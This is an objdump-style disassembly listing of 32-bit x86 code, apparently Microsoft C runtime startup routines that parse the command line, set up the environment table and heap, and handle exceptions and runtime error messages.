  405d7e:	3c 20                	cmp    $0x20,%al
  405d80:	76 e9                	jbe    0x405d6b
  405d82:	8b c6                	mov    %esi,%eax
  405d84:	5e                   	pop    %esi
  405d85:	c3                   	ret
  405d86:	53                   	push   %ebx
  405d87:	33 db                	xor    %ebx,%ebx
  405d89:	39 1d e8 c3 40 00    	cmp    %ebx,0x40c3e8
  405d8f:	56                   	push   %esi
  405d90:	57                   	push   %edi
  405d91:	75 05                	jne    0x405d98
  405d93:	e8 a2 19 00 00       	call   0x40773a
  405d98:	8b 35 cc bf 40 00    	mov    0x40bfcc,%esi
  405d9e:	33 ff                	xor    %edi,%edi
  405da0:	8a 06                	mov    (%esi),%al
  405da2:	3a c3                	cmp    %bl,%al
  405da4:	74 12                	je     0x405db8
  405da6:	3c 3d                	cmp    $0x3d,%al
  405da8:	74 01                	je     0x405dab
  405daa:	47                   	inc    %edi
  405dab:	56                   	push   %esi
  405dac:	e8 1f db ff ff       	call   0x4038d0
  405db1:	59                   	pop    %ecx
  405db2:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  405db6:	eb e8                	jmp    0x405da0
  405db8:	8d 04 bd 04 00 00 00 	lea    0x4(,%edi,4),%eax
  405dbf:	50                   	push   %eax
  405dc0:	e8 40 f3 ff ff       	call   0x405105
  405dc5:	8b f0                	mov    %eax,%esi
  405dc7:	59                   	pop    %ecx
  405dc8:	3b f3                	cmp    %ebx,%esi
  405dca:	89 35 14 c0 40 00    	mov    %esi,0x40c014
  405dd0:	75 08                	jne    0x405dda
  405dd2:	6a 09                	push   $0x9
  405dd4:	e8 74 e0 ff ff       	call   0x403e4d
  405dd9:	59                   	pop    %ecx
  405dda:	8b 3d cc bf 40 00    	mov    0x40bfcc,%edi
  405de0:	38 1f                	cmp    %bl,(%edi)
  405de2:	74 39                	je     0x405e1d
  405de4:	55                   	push   %ebp
  405de5:	57                   	push   %edi
  405de6:	e8 e5 da ff ff       	call   0x4038d0
  405deb:	8b e8                	mov    %eax,%ebp
  405ded:	59                   	pop    %ecx
  405dee:	45                   	inc    %ebp
  405def:	80 3f 3d             	cmpb   $0x3d,(%edi)
  405df2:	74 22                	je     0x405e16
  405df4:	55                   	push   %ebp
  405df5:	e8 0b f3 ff ff       	call   0x405105
  405dfa:	3b c3                	cmp    %ebx,%eax
  405dfc:	59                   	pop    %ecx
  405dfd:	89 06                	mov    %eax,(%esi)
  405dff:	75 08                	jne    0x405e09
  405e01:	6a 09                	push   $0x9
  405e03:	e8 45 e0 ff ff       	call   0x403e4d
  405e08:	59                   	pop    %ecx
  405e09:	57                   	push   %edi
  405e0a:	ff 36                	push   (%esi)
  405e0c:	e8 cf d9 ff ff       	call   0x4037e0
  405e11:	59                   	pop    %ecx
  405e12:	83 c6 04             	add    $0x4,%esi
  405e15:	59                   	pop    %ecx
  405e16:	03 fd                	add    %ebp,%edi
  405e18:	38 1f                	cmp    %bl,(%edi)
  405e1a:	75 c9                	jne    0x405de5
  405e1c:	5d                   	pop    %ebp
  405e1d:	ff 35 cc bf 40 00    	push   0x40bfcc
  405e23:	e8 51 f3 ff ff       	call   0x405179
  405e28:	59                   	pop    %ecx
  405e29:	89 1d cc bf 40 00    	mov    %ebx,0x40bfcc
  405e2f:	89 1e                	mov    %ebx,(%esi)
  405e31:	5f                   	pop    %edi
  405e32:	5e                   	pop    %esi
  405e33:	c7 05 e4 c3 40 00 01 	movl   $0x1,0x40c3e4
  405e3a:	00 00 00 
  405e3d:	5b                   	pop    %ebx
  405e3e:	c3                   	ret
  405e3f:	55                   	push   %ebp
  405e40:	8b ec                	mov    %esp,%ebp
  405e42:	51                   	push   %ecx
  405e43:	51                   	push   %ecx
  405e44:	53                   	push   %ebx
  405e45:	33 db                	xor    %ebx,%ebx
  405e47:	39 1d e8 c3 40 00    	cmp    %ebx,0x40c3e8
  405e4d:	56                   	push   %esi
  405e4e:	57                   	push   %edi
  405e4f:	75 05                	jne    0x405e56
  405e51:	e8 e4 18 00 00       	call   0x40773a
  405e56:	be 3c c0 40 00       	mov    $0x40c03c,%esi
  405e5b:	68 04 01 00 00       	push   $0x104
  405e60:	56                   	push   %esi
  405e61:	53                   	push   %ebx
  405e62:	ff 15 a4 90 40 00    	call   *0x4090a4
  405e68:	a1 24 d5 40 00       	mov    0x40d524,%eax
  405e6d:	89 35 24 c0 40 00    	mov    %esi,0x40c024
  405e73:	8b fe                	mov    %esi,%edi
  405e75:	38 18                	cmp    %bl,(%eax)
  405e77:	74 02                	je     0x405e7b
  405e79:	8b f8                	mov    %eax,%edi
  405e7b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405e7e:	50                   	push   %eax
  405e7f:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405e82:	50                   	push   %eax
  405e83:	53                   	push   %ebx
  405e84:	53                   	push   %ebx
  405e85:	57                   	push   %edi
  405e86:	e8 4d 00 00 00       	call   0x405ed8
  405e8b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405e8e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405e91:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  405e94:	50                   	push   %eax
  405e95:	e8 6b f2 ff ff       	call   0x405105
  405e9a:	8b f0                	mov    %eax,%esi
  405e9c:	83 c4 18             	add    $0x18,%esp
  405e9f:	3b f3                	cmp    %ebx,%esi
  405ea1:	75 08                	jne    0x405eab
  405ea3:	6a 08                	push   $0x8
  405ea5:	e8 a3 df ff ff       	call   0x403e4d
  405eaa:	59                   	pop    %ecx
  405eab:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405eae:	50                   	push   %eax
  405eaf:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405eb2:	50                   	push   %eax
  405eb3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405eb6:	8d 04 86             	lea    (%esi,%eax,4),%eax
  405eb9:	50                   	push   %eax
  405eba:	56                   	push   %esi
  405ebb:	57                   	push   %edi
  405ebc:	e8 17 00 00 00       	call   0x405ed8
  405ec1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405ec4:	83 c4 14             	add    $0x14,%esp
  405ec7:	48                   	dec    %eax
  405ec8:	89 35 0c c0 40 00    	mov    %esi,0x40c00c
  405ece:	5f                   	pop    %edi
  405ecf:	5e                   	pop    %esi
  405ed0:	a3 08 c0 40 00       	mov    %eax,0x40c008
  405ed5:	5b                   	pop    %ebx
  405ed6:	c9                   	leave
  405ed7:	c3                   	ret
  405ed8:	55                   	push   %ebp
  405ed9:	8b ec                	mov    %esp,%ebp
  405edb:	8b 4d 18             	mov    0x18(%ebp),%ecx
  405ede:	8b 45 14             	mov    0x14(%ebp),%eax
  405ee1:	53                   	push   %ebx
  405ee2:	56                   	push   %esi
  405ee3:	83 21 00             	andl   $0x0,(%ecx)
  405ee6:	8b 75 10             	mov    0x10(%ebp),%esi
  405ee9:	57                   	push   %edi
  405eea:	8b 7d 0c             	mov    0xc(%ebp),%edi
  405eed:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  405ef3:	8b 45 08             	mov    0x8(%ebp),%eax
  405ef6:	85 ff                	test   %edi,%edi
  405ef8:	74 08                	je     0x405f02
  405efa:	89 37                	mov    %esi,(%edi)
  405efc:	83 c7 04             	add    $0x4,%edi
  405eff:	89 7d 0c             	mov    %edi,0xc(%ebp)
  405f02:	80 38 22             	cmpb   $0x22,(%eax)
  405f05:	75 44                	jne    0x405f4b
  405f07:	8a 50 01             	mov    0x1(%eax),%dl
  405f0a:	40                   	inc    %eax
  405f0b:	80 fa 22             	cmp    $0x22,%dl
  405f0e:	74 29                	je     0x405f39
  405f10:	84 d2                	test   %dl,%dl
  405f12:	74 25                	je     0x405f39
  405f14:	0f b6 d2             	movzbl %dl,%edx
  405f17:	f6 82 c1 c2 40 00 04 	testb  $0x4,0x40c2c1(%edx)
  405f1e:	74 0c                	je     0x405f2c
  405f20:	ff 01                	incl   (%ecx)
  405f22:	85 f6                	test   %esi,%esi
  405f24:	74 06                	je     0x405f2c
  405f26:	8a 10                	mov    (%eax),%dl
  405f28:	88 16                	mov    %dl,(%esi)
  405f2a:	46                   	inc    %esi
  405f2b:	40                   	inc    %eax
  405f2c:	ff 01                	incl   (%ecx)
  405f2e:	85 f6                	test   %esi,%esi
  405f30:	74 d5                	je     0x405f07
  405f32:	8a 10                	mov    (%eax),%dl
  405f34:	88 16                	mov    %dl,(%esi)
  405f36:	46                   	inc    %esi
  405f37:	eb ce                	jmp    0x405f07
  405f39:	ff 01                	incl   (%ecx)
  405f3b:	85 f6                	test   %esi,%esi
  405f3d:	74 04                	je     0x405f43
  405f3f:	80 26 00             	andb   $0x0,(%esi)
  405f42:	46                   	inc    %esi
  405f43:	80 38 22             	cmpb   $0x22,(%eax)
  405f46:	75 46                	jne    0x405f8e
  405f48:	40                   	inc    %eax
  405f49:	eb 43                	jmp    0x405f8e
  405f4b:	ff 01                	incl   (%ecx)
  405f4d:	85 f6                	test   %esi,%esi
  405f4f:	74 05                	je     0x405f56
  405f51:	8a 10                	mov    (%eax),%dl
  405f53:	88 16                	mov    %dl,(%esi)
  405f55:	46                   	inc    %esi
  405f56:	8a 10                	mov    (%eax),%dl
  405f58:	40                   	inc    %eax
  405f59:	0f b6 da             	movzbl %dl,%ebx
  405f5c:	f6 83 c1 c2 40 00 04 	testb  $0x4,0x40c2c1(%ebx)
  405f63:	74 0c                	je     0x405f71
  405f65:	ff 01                	incl   (%ecx)
  405f67:	85 f6                	test   %esi,%esi
  405f69:	74 05                	je     0x405f70
  405f6b:	8a 18                	mov    (%eax),%bl
  405f6d:	88 1e                	mov    %bl,(%esi)
  405f6f:	46                   	inc    %esi
  405f70:	40                   	inc    %eax
  405f71:	80 fa 20             	cmp    $0x20,%dl
  405f74:	74 09                	je     0x405f7f
  405f76:	84 d2                	test   %dl,%dl
  405f78:	74 09                	je     0x405f83
  405f7a:	80 fa 09             	cmp    $0x9,%dl
  405f7d:	75 cc                	jne    0x405f4b
  405f7f:	84 d2                	test   %dl,%dl
  405f81:	75 03                	jne    0x405f86
  405f83:	48                   	dec    %eax
  405f84:	eb 08                	jmp    0x405f8e
  405f86:	85 f6                	test   %esi,%esi
  405f88:	74 04                	je     0x405f8e
  405f8a:	80 66 ff 00          	andb   $0x0,-0x1(%esi)
  405f8e:	83 65 18 00          	andl   $0x0,0x18(%ebp)
  405f92:	80 38 00             	cmpb   $0x0,(%eax)
  405f95:	0f 84 e0 00 00 00    	je     0x40607b
  405f9b:	8a 10                	mov    (%eax),%dl
  405f9d:	80 fa 20             	cmp    $0x20,%dl
  405fa0:	74 05                	je     0x405fa7
  405fa2:	80 fa 09             	cmp    $0x9,%dl
  405fa5:	75 03                	jne    0x405faa
  405fa7:	40                   	inc    %eax
  405fa8:	eb f1                	jmp    0x405f9b
  405faa:	80 38 00             	cmpb   $0x0,(%eax)
  405fad:	0f 84 c8 00 00 00    	je     0x40607b
  405fb3:	85 ff                	test   %edi,%edi
  405fb5:	74 08                	je     0x405fbf
  405fb7:	89 37                	mov    %esi,(%edi)
  405fb9:	83 c7 04             	add    $0x4,%edi
  405fbc:	89 7d 0c             	mov    %edi,0xc(%ebp)
  405fbf:	8b 55 14             	mov    0x14(%ebp),%edx
  405fc2:	ff 02                	incl   (%edx)
  405fc4:	c7 45 08 01 00 00 00 	movl   $0x1,0x8(%ebp)
  405fcb:	33 db                	xor    %ebx,%ebx
  405fcd:	80 38 5c             	cmpb   $0x5c,(%eax)
  405fd0:	75 04                	jne    0x405fd6
  405fd2:	40                   	inc    %eax
  405fd3:	43                   	inc    %ebx
  405fd4:	eb f7                	jmp    0x405fcd
  405fd6:	80 38 22             	cmpb   $0x22,(%eax)
  405fd9:	75 2c                	jne    0x406007
  405fdb:	f6 c3 01             	test   $0x1,%bl
  405fde:	75 25                	jne    0x406005
  405fe0:	33 ff                	xor    %edi,%edi
  405fe2:	39 7d 18             	cmp    %edi,0x18(%ebp)
  405fe5:	74 0d                	je     0x405ff4
  405fe7:	80 78 01 22          	cmpb   $0x22,0x1(%eax)
  405feb:	8d 50 01             	lea    0x1(%eax),%edx
  405fee:	75 04                	jne    0x405ff4
  405ff0:	8b c2                	mov    %edx,%eax
  405ff2:	eb 03                	jmp    0x405ff7
  405ff4:	89 7d 08             	mov    %edi,0x8(%ebp)
  405ff7:	8b 7d 0c             	mov    0xc(%ebp),%edi
  405ffa:	33 d2                	xor    %edx,%edx
  405ffc:	39 55 18             	cmp    %edx,0x18(%ebp)
  405fff:	0f 94 c2             	sete   %dl
  406002:	89 55 18             	mov    %edx,0x18(%ebp)
  406005:	d1 eb                	shr    $1,%ebx
  406007:	8b d3                	mov    %ebx,%edx
  406009:	4b                   	dec    %ebx
  40600a:	85 d2                	test   %edx,%edx
  40600c:	74 0e                	je     0x40601c
  40600e:	43                   	inc    %ebx
  40600f:	85 f6                	test   %esi,%esi
  406011:	74 04                	je     0x406017
  406013:	c6 06 5c             	movb   $0x5c,(%esi)
  406016:	46                   	inc    %esi
  406017:	ff 01                	incl   (%ecx)
  406019:	4b                   	dec    %ebx
  40601a:	75 f3                	jne    0x40600f
  40601c:	8a 10                	mov    (%eax),%dl
  40601e:	84 d2                	test   %dl,%dl
  406020:	74 4a                	je     0x40606c
  406022:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
  406026:	75 0a                	jne    0x406032
  406028:	80 fa 20             	cmp    $0x20,%dl
  40602b:	74 3f                	je     0x40606c
  40602d:	80 fa 09             	cmp    $0x9,%dl
  406030:	74 3a                	je     0x40606c
  406032:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  406036:	74 2e                	je     0x406066
  406038:	85 f6                	test   %esi,%esi
  40603a:	74 19                	je     0x406055
  40603c:	0f b6 da             	movzbl %dl,%ebx
  40603f:	f6 83 c1 c2 40 00 04 	testb  $0x4,0x40c2c1(%ebx)
  406046:	74 06                	je     0x40604e
  406048:	88 16                	mov    %dl,(%esi)
  40604a:	46                   	inc    %esi
  40604b:	40                   	inc    %eax
  40604c:	ff 01                	incl   (%ecx)
  40604e:	8a 10                	mov    (%eax),%dl
  406050:	88 16                	mov    %dl,(%esi)
  406052:	46                   	inc    %esi
  406053:	eb 0f                	jmp    0x406064
  406055:	0f b6 d2             	movzbl %dl,%edx
  406058:	f6 82 c1 c2 40 00 04 	testb  $0x4,0x40c2c1(%edx)
  40605f:	74 03                	je     0x406064
  406061:	40                   	inc    %eax
  406062:	ff 01                	incl   (%ecx)
  406064:	ff 01                	incl   (%ecx)
  406066:	40                   	inc    %eax
  406067:	e9 58 ff ff ff       	jmp    0x405fc4
  40606c:	85 f6                	test   %esi,%esi
  40606e:	74 04                	je     0x406074
  406070:	80 26 00             	andb   $0x0,(%esi)
  406073:	46                   	inc    %esi
  406074:	ff 01                	incl   (%ecx)
  406076:	e9 17 ff ff ff       	jmp    0x405f92
  40607b:	85 ff                	test   %edi,%edi
  40607d:	74 03                	je     0x406082
  40607f:	83 27 00             	andl   $0x0,(%edi)
  406082:	8b 45 14             	mov    0x14(%ebp),%eax
  406085:	5f                   	pop    %edi
  406086:	5e                   	pop    %esi
  406087:	5b                   	pop    %ebx
  406088:	ff 00                	incl   (%eax)
  40608a:	5d                   	pop    %ebp
  40608b:	c3                   	ret
  40608c:	51                   	push   %ecx
  40608d:	51                   	push   %ecx
  40608e:	a1 40 c1 40 00       	mov    0x40c140,%eax
  406093:	53                   	push   %ebx
  406094:	55                   	push   %ebp
  406095:	8b 2d b8 90 40 00    	mov    0x4090b8,%ebp
  40609b:	56                   	push   %esi
  40609c:	57                   	push   %edi
  40609d:	33 db                	xor    %ebx,%ebx
  40609f:	33 f6                	xor    %esi,%esi
  4060a1:	33 ff                	xor    %edi,%edi
  4060a3:	3b c3                	cmp    %ebx,%eax
  4060a5:	75 33                	jne    0x4060da
  4060a7:	ff d5                	call   *%ebp
  4060a9:	8b f0                	mov    %eax,%esi
  4060ab:	3b f3                	cmp    %ebx,%esi
  4060ad:	74 0c                	je     0x4060bb
  4060af:	c7 05 40 c1 40 00 01 	movl   $0x1,0x40c140
  4060b6:	00 00 00 
  4060b9:	eb 28                	jmp    0x4060e3
  4060bb:	ff 15 b4 90 40 00    	call   *0x4090b4
  4060c1:	8b f8                	mov    %eax,%edi
  4060c3:	3b fb                	cmp    %ebx,%edi
  4060c5:	0f 84 ea 00 00 00    	je     0x4061b5
  4060cb:	c7 05 40 c1 40 00 02 	movl   $0x2,0x40c140
  4060d2:	00 00 00 
  4060d5:	e9 8f 00 00 00       	jmp    0x406169
  4060da:	83 f8 01             	cmp    $0x1,%eax
  4060dd:	0f 85 81 00 00 00    	jne    0x406164
  4060e3:	3b f3                	cmp    %ebx,%esi
  4060e5:	75 0c                	jne    0x4060f3
  4060e7:	ff d5                	call   *%ebp
  4060e9:	8b f0                	mov    %eax,%esi
  4060eb:	3b f3                	cmp    %ebx,%esi
  4060ed:	0f 84 c2 00 00 00    	je     0x4061b5
  4060f3:	66 39 1e             	cmp    %bx,(%esi)
  4060f6:	8b c6                	mov    %esi,%eax
  4060f8:	74 0e                	je     0x406108
  4060fa:	40                   	inc    %eax
  4060fb:	40                   	inc    %eax
  4060fc:	66 39 18             	cmp    %bx,(%eax)
  4060ff:	75 f9                	jne    0x4060fa
  406101:	40                   	inc    %eax
  406102:	40                   	inc    %eax
  406103:	66 39 18             	cmp    %bx,(%eax)
  406106:	75 f2                	jne    0x4060fa
  406108:	2b c6                	sub    %esi,%eax
  40610a:	8b 3d b0 90 40 00    	mov    0x4090b0,%edi
  406110:	d1 f8                	sar    $1,%eax
  406112:	53                   	push   %ebx
  406113:	53                   	push   %ebx
  406114:	40                   	inc    %eax
  406115:	53                   	push   %ebx
  406116:	53                   	push   %ebx
  406117:	50                   	push   %eax
  406118:	56                   	push   %esi
  406119:	53                   	push   %ebx
  40611a:	53                   	push   %ebx
  40611b:	89 44 24 34          	mov    %eax,0x34(%esp)
  40611f:	ff d7                	call   *%edi
  406121:	8b e8                	mov    %eax,%ebp
  406123:	3b eb                	cmp    %ebx,%ebp
  406125:	74 32                	je     0x406159
  406127:	55                   	push   %ebp
  406128:	e8 d8 ef ff ff       	call   0x405105
  40612d:	3b c3                	cmp    %ebx,%eax
  40612f:	59                   	pop    %ecx
  406130:	89 44 24 10          	mov    %eax,0x10(%esp)
  406134:	74 23                	je     0x406159
  406136:	53                   	push   %ebx
  406137:	53                   	push   %ebx
  406138:	55                   	push   %ebp
  406139:	50                   	push   %eax
  40613a:	ff 74 24 24          	push   0x24(%esp)
  40613e:	56                   	push   %esi
  40613f:	53                   	push   %ebx
  406140:	53                   	push   %ebx
  406141:	ff d7                	call   *%edi
  406143:	85 c0                	test   %eax,%eax
  406145:	75 0e                	jne    0x406155
  406147:	ff 74 24 10          	push   0x10(%esp)
  40614b:	e8 29 f0 ff ff       	call   0x405179
  406150:	59                   	pop    %ecx
  406151:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  406155:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  406159:	56                   	push   %esi
  40615a:	ff 15 ac 90 40 00    	call   *0x4090ac
  406160:	8b c3                	mov    %ebx,%eax
  406162:	eb 53                	jmp    0x4061b7
  406164:	83 f8 02             	cmp    $0x2,%eax
  406167:	75 4c                	jne    0x4061b5
  406169:	3b fb                	cmp    %ebx,%edi
  40616b:	75 0c                	jne    0x406179
  40616d:	ff 15 b4 90 40 00    	call   *0x4090b4
  406173:	8b f8                	mov    %eax,%edi
  406175:	3b fb                	cmp    %ebx,%edi
  406177:	74 3c                	je     0x4061b5
  406179:	38 1f                	cmp    %bl,(%edi)
  40617b:	8b c7                	mov    %edi,%eax
  40617d:	74 0a                	je     0x406189
  40617f:	40                   	inc    %eax
  406180:	38 18                	cmp    %bl,(%eax)
  406182:	75 fb                	jne    0x40617f
  406184:	40                   	inc    %eax
  406185:	38 18                	cmp    %bl,(%eax)
  406187:	75 f6                	jne    0x40617f
  406189:	2b c7                	sub    %edi,%eax
  40618b:	40                   	inc    %eax
  40618c:	8b e8                	mov    %eax,%ebp
  40618e:	55                   	push   %ebp
  40618f:	e8 71 ef ff ff       	call   0x405105
  406194:	8b f0                	mov    %eax,%esi
  406196:	59                   	pop    %ecx
  406197:	3b f3                	cmp    %ebx,%esi
  406199:	75 04                	jne    0x40619f
  40619b:	33 f6                	xor    %esi,%esi
  40619d:	eb 0b                	jmp    0x4061aa
  40619f:	55                   	push   %ebp
  4061a0:	57                   	push   %edi
  4061a1:	56                   	push   %esi
  4061a2:	e8 29 ec ff ff       	call   0x404dd0
  4061a7:	83 c4 0c             	add    $0xc,%esp
  4061aa:	57                   	push   %edi
  4061ab:	ff 15 a8 90 40 00    	call   *0x4090a8
  4061b1:	8b c6                	mov    %esi,%eax
  4061b3:	eb 02                	jmp    0x4061b7
  4061b5:	33 c0                	xor    %eax,%eax
  4061b7:	5f                   	pop    %edi
  4061b8:	5e                   	pop    %esi
  4061b9:	5d                   	pop    %ebp
  4061ba:	5b                   	pop    %ebx
  4061bb:	59                   	pop    %ecx
  4061bc:	59                   	pop    %ecx
  4061bd:	c3                   	ret
  4061be:	33 c0                	xor    %eax,%eax
  4061c0:	6a 00                	push   $0x0
  4061c2:	39 44 24 08          	cmp    %eax,0x8(%esp)
  4061c6:	68 00 10 00 00       	push   $0x1000
  4061cb:	0f 94 c0             	sete   %al
  4061ce:	50                   	push   %eax
  4061cf:	ff 15 c0 90 40 00    	call   *0x4090c0
  4061d5:	85 c0                	test   %eax,%eax
  4061d7:	a3 e0 c3 40 00       	mov    %eax,0x40c3e0
  4061dc:	74 15                	je     0x4061f3
  4061de:	e8 3d 08 00 00       	call   0x406a20
  4061e3:	85 c0                	test   %eax,%eax
  4061e5:	75 0f                	jne    0x4061f6
  4061e7:	ff 35 e0 c3 40 00    	push   0x40c3e0
  4061ed:	ff 15 bc 90 40 00    	call   *0x4090bc
  4061f3:	33 c0                	xor    %eax,%eax
  4061f5:	c3                   	ret
  4061f6:	6a 01                	push   $0x1
  4061f8:	58                   	pop    %eax
  4061f9:	c3                   	ret
  4061fa:	cc                   	int3
  4061fb:	cc                   	int3
  4061fc:	56                   	push   %esi
  4061fd:	43                   	inc    %ebx
  4061fe:	32 30                	xor    (%eax),%dh
  406200:	58                   	pop    %eax
  406201:	43                   	inc    %ebx
  406202:	30 30                	xor    %dh,(%eax)
  406204:	55                   	push   %ebp
  406205:	8b ec                	mov    %esp,%ebp
  406207:	83 ec 08             	sub    $0x8,%esp
  40620a:	53                   	push   %ebx
  40620b:	56                   	push   %esi
  40620c:	57                   	push   %edi
  40620d:	55                   	push   %ebp
  40620e:	fc                   	cld
  40620f:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  406212:	8b 45 08             	mov    0x8(%ebp),%eax
  406215:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  40621c:	0f 85 82 00 00 00    	jne    0x4062a4
  406222:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406225:	8b 45 10             	mov    0x10(%ebp),%eax
  406228:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40622b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40622e:	89 43 fc             	mov    %eax,-0x4(%ebx)
  406231:	8b 73 0c             	mov    0xc(%ebx),%esi
  406234:	8b 7b 08             	mov    0x8(%ebx),%edi
  406237:	83 fe ff             	cmp    $0xffffffff,%esi
  40623a:	74 61                	je     0x40629d
  40623c:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  40623f:	83 7c 8f 04 00       	cmpl   $0x0,0x4(%edi,%ecx,4)
  406244:	74 45                	je     0x40628b
  406246:	56                   	push   %esi
  406247:	55                   	push   %ebp
  406248:	8d 6b 10             	lea    0x10(%ebx),%ebp
  40624b:	ff 54 8f 04          	call   *0x4(%edi,%ecx,4)
  40624f:	5d                   	pop    %ebp
  406250:	5e                   	pop    %esi
  406251:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  406254:	0b c0                	or     %eax,%eax
  406256:	74 33                	je     0x40628b
  406258:	78 3c                	js     0x406296
  40625a:	8b 7b 08             	mov    0x8(%ebx),%edi
  40625d:	53                   	push   %ebx
  40625e:	e8 e5 d9 ff ff       	call   0x403c48
  406263:	83 c4 04             	add    $0x4,%esp
  406266:	8d 6b 10             	lea    0x10(%ebx),%ebp
  406269:	56                   	push   %esi
  40626a:	53                   	push   %ebx
  40626b:	e8 1a da ff ff       	call   0x403c8a
  406270:	83 c4 08             	add    $0x8,%esp
  406273:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  406276:	6a 01                	push   $0x1
  406278:	8b 44 8f 08          	mov    0x8(%edi,%ecx,4),%eax
  40627c:	e8 9d da ff ff       	call   0x403d1e
  406281:	8b 04 8f             	mov    (%edi,%ecx,4),%eax
  406284:	89 43 0c             	mov    %eax,0xc(%ebx)
  406287:	ff 54 8f 08          	call   *0x8(%edi,%ecx,4)
  40628b:	8b 7b 08             	mov    0x8(%ebx),%edi
  40628e:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  406291:	8b 34 8f             	mov    (%edi,%ecx,4),%esi
  406294:	eb a1                	jmp    0x406237
  406296:	b8 00 00 00 00       	mov    $0x0,%eax
  40629b:	eb 1c                	jmp    0x4062b9
  40629d:	b8 01 00 00 00       	mov    $0x1,%eax
  4062a2:	eb 15                	jmp    0x4062b9
  4062a4:	55                   	push   %ebp
  4062a5:	8d 6b 10             	lea    0x10(%ebx),%ebp
  4062a8:	6a ff                	push   $0xffffffff
  4062aa:	53                   	push   %ebx
  4062ab:	e8 da d9 ff ff       	call   0x403c8a
  4062b0:	83 c4 08             	add    $0x8,%esp
  4062b3:	5d                   	pop    %ebp
  4062b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4062b9:	5d                   	pop    %ebp
  4062ba:	5f                   	pop    %edi
  4062bb:	5e                   	pop    %esi
  4062bc:	5b                   	pop    %ebx
  4062bd:	8b e5                	mov    %ebp,%esp
  4062bf:	5d                   	pop    %ebp
  4062c0:	c3                   	ret
  4062c1:	55                   	push   %ebp
  4062c2:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4062c6:	8b 29                	mov    (%ecx),%ebp
  4062c8:	8b 41 1c             	mov    0x1c(%ecx),%eax
  4062cb:	50                   	push   %eax
  4062cc:	8b 41 18             	mov    0x18(%ecx),%eax
  4062cf:	50                   	push   %eax
  4062d0:	e8 b5 d9 ff ff       	call   0x403c8a
  4062d5:	83 c4 08             	add    $0x8,%esp
  4062d8:	5d                   	pop    %ebp
  4062d9:	c2 04 00             	ret    $0x4
  4062dc:	a1 d4 bf 40 00       	mov    0x40bfd4,%eax
  4062e1:	83 f8 01             	cmp    $0x1,%eax
  4062e4:	74 0d                	je     0x4062f3
  4062e6:	85 c0                	test   %eax,%eax
  4062e8:	75 2a                	jne    0x406314
  4062ea:	83 3d 34 b7 40 00 01 	cmpl   $0x1,0x40b734
  4062f1:	75 21                	jne    0x406314
  4062f3:	68 fc 00 00 00       	push   $0xfc
  4062f8:	e8 18 00 00 00       	call   0x406315
  4062fd:	a1 44 c1 40 00       	mov    0x40c144,%eax
  406302:	59                   	pop    %ecx
  406303:	85 c0                	test   %eax,%eax
  406305:	74 02                	je     0x406309
  406307:	ff d0                	call   *%eax
  406309:	68 ff 00 00 00       	push   $0xff
  40630e:	e8 02 00 00 00       	call   0x406315
  406313:	59                   	pop    %ecx
  406314:	c3                   	ret
  406315:	55                   	push   %ebp
  406316:	8b ec                	mov    %esp,%ebp
  406318:	81 ec a4 01 00 00    	sub    $0x1a4,%esp
  40631e:	8b 55 08             	mov    0x8(%ebp),%edx
  406321:	33 c9                	xor    %ecx,%ecx
  406323:	b8 88 ba 40 00       	mov    $0x40ba88,%eax
  406328:	3b 10                	cmp    (%eax),%edx
  40632a:	74 0b                	je     0x406337
  40632c:	83 c0 08             	add    $0x8,%eax
  40632f:	41                   	inc    %ecx
  406330:	3d 18 bb 40 00       	cmp    $0x40bb18,%eax
  406335:	7c f1                	jl     0x406328
  406337:	56                   	push   %esi
  406338:	8b f1                	mov    %ecx,%esi
  40633a:	c1 e6 03             	shl    $0x3,%esi
  40633d:	3b 96 88 ba 40 00    	cmp    0x40ba88(%esi),%edx
  406343:	0f 85 1c 01 00 00    	jne    0x406465
  406349:	a1 d4 bf 40 00       	mov    0x40bfd4,%eax
  40634e:	83 f8 01             	cmp    $0x1,%eax
  406351:	0f 84 e8 00 00 00    	je     0x40643f
  406357:	85 c0                	test   %eax,%eax
  406359:	75 0d                	jne    0x406368
  40635b:	83 3d 34 b7 40 00 01 	cmpl   $0x1,0x40b734
  406362:	0f 84 d7 00 00 00    	je     0x40643f
  406368:	81 fa fc 00 00 00    	cmp    $0xfc,%edx
  40636e:	0f 84 f1 00 00 00    	je     0x406465
  406374:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  40637a:	68 04 01 00 00       	push   $0x104
  40637f:	50                   	push   %eax
  406380:	6a 00                	push   $0x0
  406382:	ff 15 a4 90 40 00    	call   *0x4090a4
  406388:	85 c0                	test   %eax,%eax
  40638a:	75 13                	jne    0x40639f
  40638c:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  406392:	68 88 95 40 00       	push   $0x409588
  406397:	50                   	push   %eax
  406398:	e8 43 d4 ff ff       	call   0x4037e0
  40639d:	59                   	pop    %ecx
  40639e:	59                   	pop    %ecx
  40639f:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  4063a5:	57                   	push   %edi
  4063a6:	50                   	push   %eax
  4063a7:	8d bd 5c fe ff ff    	lea    -0x1a4(%ebp),%edi
  4063ad:	e8 1e d5 ff ff       	call   0x4038d0
  4063b2:	40                   	inc    %eax
